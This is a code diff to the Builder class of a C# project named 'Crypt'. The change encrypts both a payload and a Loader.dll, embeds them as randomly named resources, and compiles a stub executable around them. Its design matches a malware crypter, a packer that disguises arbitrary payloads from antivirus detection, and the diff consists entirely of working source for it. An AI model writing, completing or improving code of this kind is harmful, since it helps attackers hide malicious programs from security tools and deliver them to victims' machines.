@@ -14,11 +14,20 @@ namespace Crypt
     {
         Byte[] payload;
         Options options;
+        string loaderPath;
 
         public Builder(byte[] payload, Options options)
         {
             this.payload = payload;
             this.options = options;
+
+            //Super hacky
+            //TODO: Find better way to access Loader.dll
+#if DEBUG
+            loaderPath = @"..\..\..\Loader\bin\Debug\Loader.dll";
+#else
+            loaderPath = @"..\..\..\Loader\bin\Release\Loader.dll";
+#endif
         }
 
         public bool Build()
@@ -26,25 +35,27 @@ namespace Crypt
             options.encryptionKey = Encryption.GenerateKey();
             options.resFileName = Guid.NewGuid().ToString().Substring(0, 5);
             options.resPayloadName = Guid.NewGuid().ToString().Substring(0, 5);
+            options.resLoaderName = Guid.NewGuid().ToString().Substring(0, 5);
 
-            Byte[] encryptedPL = Encrypt(payload, options.encryptionType);
+            Byte[] encPayload = Encrypt(payload);
+            Byte[] encLoader = Encrypt(File.ReadAllBytes(loaderPath));
             string stubSrc = AddInfo(Properties.Resources.Stub);
 
-            bool result = Compile(encryptedPL, stubSrc);
+            bool result = Compile(encPayload, encLoader, stubSrc);
             return result;
         }
 
-        private byte[] Encrypt(Byte[] input, EncryptionType encryptionType)
+        private byte[] Encrypt(Byte[] input)
         {
             Byte[] encryptedPL;
             switch (options.encryptionType)
             {
                 case EncryptionType.Rijndael:
-                    encryptedPL = Encryption.RijndaelEncrypt(payload, options.encryptionKey);
+                    encryptedPL = Encryption.RijndaelEncrypt(input, options.encryptionKey);
                     break;
                 case EncryptionType.XOR:
                 default:
-                    encryptedPL = Encryption.Xor(payload, options.encryptionKey);
+                    encryptedPL = Encryption.Xor(input, options.encryptionKey);
                     break;
             }
 
@@ -56,22 +67,24 @@ namespace Crypt
             string newStub = stubSrc.Replace("[encryptionKey]", Convert.ToBase64String(options.encryptionKey));
             newStub = newStub.Replace("[resFileName]", options.resFileName);
             newStub = newStub.Replace("[resPayloadName]", options.resPayloadName);
+            newStub = newStub.Replace("[resLoaderName]", options.resLoaderName);
 
             return newStub;
         }
 
-        private string CreateResource(byte[] encryptedPL)
+        private string CreateResource(byte[] encPayload, byte[] encLoader)
         {
             string resourceDir = options.resFileName + ".resources";
             using (ResourceWriter resourceWriter = new ResourceWriter(resourceDir))
             {
-                resourceWriter.AddResource(options.resPayloadName, encryptedPL);
+                resourceWriter.AddResource(options.resPayloadName, encPayload);
+                resourceWriter.AddResource(options.resLoaderName, encLoader);
                 resourceWriter.Generate();
             }
             return resourceDir;
         }
 
-        private bool Compile(byte[] encryptedPL, string stubSrc)
+        private bool Compile(byte[] encPayload, byte[] encLoader, string stubSrc)
         {
             CompilerParameters compParams = new CompilerParameters();
             compParams.GenerateExecutable = true;
@@ -83,7 +96,7 @@ namespace Crypt
             compParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
             compParams.ReferencedAssemblies.Add("System.Drawing.dll");
 
-            string resourceDir = CreateResource(encryptedPL);
+            string resourceDir = CreateResource(encPayload, encLoader);
             compParams.EmbeddedResources.Add(resourceDir);
 
             Dictionary<string, string> providerOptions = new Dictionary<string, string>();
